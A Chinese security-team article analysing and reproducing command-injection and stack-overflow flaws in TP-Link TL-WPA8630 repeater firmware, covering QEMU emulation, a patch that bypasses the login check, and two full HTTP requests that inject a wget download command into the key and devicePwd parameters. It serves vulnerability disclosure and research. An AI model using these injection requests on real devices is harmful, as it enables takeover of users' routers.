---
title: TPLink 中继器设备命令注入漏洞分析及复现
url: https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247508316&idx=1&sn=36d50d5692915ad1113d4db76ad5aba6&chksm=e89d8984dfea00926f74ec20e7842fdf5c4e7fde82d0f0b0cf2ac10c530ae21a3e0fa374cf65&scene=58&subscene=0#rd
source: ChaMd5安全团队
date: 2023-03-07
fetch_date: 2025-10-04T08:49:17.704984
---

# TPLink 中继器设备命令注入漏洞分析及复现

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/PUubqXlrzBRUacTdpOicYLYvvjP7h3OcZw5JPRCiaX5QibrwibHLkNlCLzCSGlbMqHaSgiaTHFDtq1FsV8Ukr29mvPw/0?wx_fmt=jpeg)

# TPLink 中继器设备命令注入漏洞分析及复现

原创

Sezangel

ChaMd5安全团队

写在前面：

在分析TPlink中继器设备时（这里以TL-WPA8630为代表），发现了两处可以利用的命令注入和栈溢出漏洞，因此借这个机会，将TPlink此类设备的模拟方法也进行了研究，并在本地对漏洞进行了复现。相关漏洞已经提交至CVE官网。

漏洞介绍：
在httpd文件处理admin/powerline的sub\_40A918函数中，存在两处命令注入漏洞（也可以构造栈溢出）。对plc\_device对应的key参数、plc\_add对应的devicePwd参数不加过滤，直接vsprintf拼接执行，造成命令注入，也可以实现栈溢出攻击。
版本：TL-WPA8630 KIT(US)\_V2\_171011版，以及其他WPA、WR、WA等电力猫与中继器设备对应版本。

**漏洞静态分析**
httpd文件调用sub\_40A918处理/admin/powerline的对应请求：

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBRUacTdpOicYLYvvjP7h3OcZYNjvhK6iajPicngRgb3vKjztQan3xmbzUKXjMmibMhucE1HFzGpsDnZfw/640?wx_fmt=png)

sub\_40A918首先判断form参数，如果form参数是plc\_device，则交给sub\_40A774函数处理，如果form参数是plc\_add，则交给sub\_40A80C函数处理，这两个函数都有漏洞，我们依次分析。

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBRUacTdpOicYLYvvjP7h3OcZ4zL28zqYctV7a8nrBbnI9dCxx06iab1YLxCXFEHAlWKQGgO3v4scvMA/640?wx_fmt=png)

sub\_40A774函数如下，获取operation参数，如果参数是remove，则获取后续key参数，然后将key交给sub\_4036A0函数处理，后续会将key的参数直接用vsprintf凭借，然后执行，既可以实现命令注入，又可以实现栈溢出。

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBRUacTdpOicYLYvvjP7h3OcZSkKxicJlj9DOVvgf8fsKY4eWlp6q70oQzseXmLTZYA4zBvqeC1jo3kw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBRUacTdpOicYLYvvjP7h3OcZSeem5KOpR9mVYc8FvNLglZUibm7GHLyCyVfqSrs02ZrGBeqkqu66ckg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBRUacTdpOicYLYvvjP7h3OcZ5C2qREic4hRWefW8Rs6hSia85qa9erjqhQ6JxzwSCPzic8JugOibPT9NmA/640?wx_fmt=png)

sub\_40A80C函数如下，获取operation参数，如果参数是write，则获取后续devicePwd参数，然后将其交给sub\_4036A0函数处理，同上述一样，既可以实现命令注入，又可以实现栈溢出。

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBRUacTdpOicYLYvvjP7h3OcZCXcaAORM0PFfvnkzd6u7bCRcGZxuUsYzHpD4lAVCREEZibjxAd2EbJA/640?wx_fmt=png)

**固件模拟**
基本步骤和往常的设备模拟一样，利用qemu进行系统模拟，命令如下：

```
#qemu系统模式启动
sudo qemu-system-mips -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_wheezy_mips_standard.qcow2 -append "root=/dev/sda1 console=tty0" -net nic -net tap -nographic
#主机网卡配置
#! /bin/sh
sudo sysctl -w net.ipv4.ip_forward=1
sudo iptables -F
sudo iptables -X
sudo iptables -t nat -F
sudo iptables -t nat -X
sudo iptables -t mangle -F
sudo iptables -t mangle -X
sudo iptables -P INPUT ACCEPT
sudo iptables -P FORWARD ACCEPT
sudo iptables -P OUTPUT ACCEPT
sudo iptables -t nat -A POSTROUTING -o ens33 -j MASQUERADE
sudo iptables -I FORWARD 1 -i tap0 -j ACCEPT
sudo iptables -I FORWARD 1 -o tap0 -m state --state RELATED,ESTABLISHED -j ACCEPT
sudo ifconfig tap0 192.168.100.254 netmask 255.255.255.0
#qemu网卡配置
#！/bin/sh
ifconfig eth0 192.168.100.2 netmask 255.255.255.0
route add default gw 192.168.100.254
#文件系统上传
scp -r squashfs-root/ root@192.168.100.2:~/
#挂载执行：
mount -o bind /dev ./squashfs-root/dev
mount -t proc /proc ./squashfs-root/proc
chroot squashfs-root sh
```

在完成基本环境搭建后，下面还是最困难的问题，启动设备的web服务，直接启动httpd文件：

```
./usr/bin/httpd
```

发现没有任何报错，然后我们访问对应对应IP：http://192.168.100.2/index.html， 居然直接成功访问登录界面：

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBRUacTdpOicYLYvvjP7h3OcZ6PpmEwPgAd795ojcXHiciblSpXfpReDarHTf69LUD3Ru5D97C4PQcWbA/640?wx_fmt=png)

心里非常惊喜，以为模拟成功，结果发现并没有。输入TPLink的初始用户名和密码：admin、admin，结果提示，用户名和密码错误。按理来说，此设备的默认密码就是admin，但是发生了错误，说明问题出现在登录时的密码验证环节。我们用burpsuite抓一下登陆时的数据包，发现设备会将输入的用户名和密码写入Cookie的Authorization字段。

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBRUacTdpOicYLYvvjP7h3OcZia1qRfoicfvibVHOiaV8VMcjPNzTekibXmTRQkibVcORbQ4DAwrulFweHUoA/640?wx_fmt=png)

我们在IDA里逆向对应的处理流程，程序会先读取Authorization字段，然后在sub\_4269B4函数中进行了处理，并进行了分支跳转。盲猜sub\_4269B4函数功能就是对登录字段进行校验。

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBRUacTdpOicYLYvvjP7h3OcZN8eRdMxaSmF6tIqTp7dznfib3oKU5uR3GPQyTqPcr8MJfA5d4BtLjVg/640?wx_fmt=png)

分析sub\_4269B4函数，发现该函数确实在进行授权校验，主要原理就是将Authorization字段，同config文件夹下的account.config配置文件中的对应结果进行匹配，匹配失败则返回-1。由于我们直接对解包后的文件系统进行模拟的缘故，config文件夹下并没有相关配置文件，因此登录时会验证失败。

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBRUacTdpOicYLYvvjP7h3OcZGQziccoEjvcuVSt6pgHxibWbsFwUhGmy6IHNKU9HbrNCdaOb7txAzTIw/640?wx_fmt=png)

因此，我们要么构造一个符合TPlink结构的config配置文件，要么直接对登录流程进行patch，我们当然选择比较简单的patch方法，只需要将登录的验证跳转分支修改即可。我们将sub\_4269B4函数判断改为-1登陆成功，也就是将bltz指令改为bgez指令即可。

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBRUacTdpOicYLYvvjP7h3OcZg1UOiaNBpMl9HB3MGI3pBheXkjpa4MsOnFpUe8omTW6hzmePscavoDw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBRUacTdpOicYLYvvjP7h3OcZmb1dkdxWCzr2ujGnyXsSib4c6Ats8Gx8hiaaxP1tBH7oUB1BgOQjSPJA/640?wx_fmt=png)

将新的httpd文件上传至qemu，此时输入admin、admin，即可成功登入主界面（其实此时应该是任意用户名和密码都可以登入了）：

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBRUacTdpOicYLYvvjP7h3OcZaKiaT3xaq9crkxAcktHGnhwybnp83lvdcLTuDrecugqH5BOpyVdLerg/640?wx_fmt=png)

**漏洞动态复现**
我们分别对两个漏洞点进行复现，在这里我们采用wget命令，验证能否下载文件来证明命令注入成功，在ubuntu中用python搭建简易的web服务器：

```
python3 -m http.server
```

首先是plc\_device对应的漏洞，发送数据包如下：

```
POST /admin/powerline HTTP/1.1
Host: 192.168.100.2
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 63
Origin: http://192.168.100.2
Connection: close
Referer: http://192.168.100.2/
Cookie: Authorization=Basic%20admin%3A21232f297a57a5a743894a0e4a801fc3

xxxxxxxxxxxxxxxxxxxxxxxxxx;wget http://192.168.100.254:8000/net.sh;

#不过实际抓包时，发现form参数是跟在POST的URL后面传的，不过两种传参都可以
POST /admin/powerline?form=plc_device HTTP/1.1
```

成功实现对恶意文件net.sh的下载：

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBRUacTdpOicYLYvvjP7h3OcZ79Jic6nMcg27nyEpoBZWCSHY546KPvzs8hm0RicOuFqnzhiaiaoDxdBqJA/640?wx_fmt=png)

其次是plc\_add对应的漏洞，发送数据包如下：

```
POST /admin/powerline HTTP/1.1
Host: 192.168.100.2
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 68
Origin: http://192.168.100.2
Connection: close
Referer: http://192.168.100.2/
Cookie: Authorization=Basic%20admin%3A21232f297a57a5a743894a0e4a801fc3

xxxxxxxxxxxxxxxxxxxxxxxxxx;wget http://192.168.100.254:8000/net.sh;

#不过实际抓包时，发现form参数是跟在POST的URL后面传的，不过两种传参都可以
POST /admin/powerline?form=plc_add HTTP/1.1
```

成功实现对恶意文件net.sh的下载：

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBRUacTdpOicYLYvvjP7h3OcZ79Jic6nMcg27nyEpoBZWCSHY546KPvzs8hm0RicOuFqnzhiaiaoDxdBqJA/640?wx_fmt=png)

以上为漏洞复现全过程，主要实现了对该品牌此类设备的模拟，并将漏洞进行了实际复现，相关设备具有较多的部署和资产，因此需要用户及时更新设备版本。

end

招新小广告

ChaMd5 Venom 招收大佬入圈

新成立组IOT+工控+样本分析 长期招新

欢迎联系admin@chamd5.org

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBR8nk7RR7HefBINILy4PClwoEMzGCJovye9KIsEjCKwxlqcSFsGJSv3OtYIjmKpXzVyfzlqSicWwxQ/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBRyftF8Oqhh2V8ib6wEgOiaCMdKBLfkLlHAvKibMgjerLzeXXxRmyI9VpjX7e37vjeW2scODia9KHGoqQ/0?wx_fmt=png)

ChaMd5安全团队

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBRyftF8Oqhh2V8ib6wEgOiaCMdKBLfkLlHAvKibMgjerLzeXXxRmyI9VpjX7e37vjeW2scODia9KHGoqQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过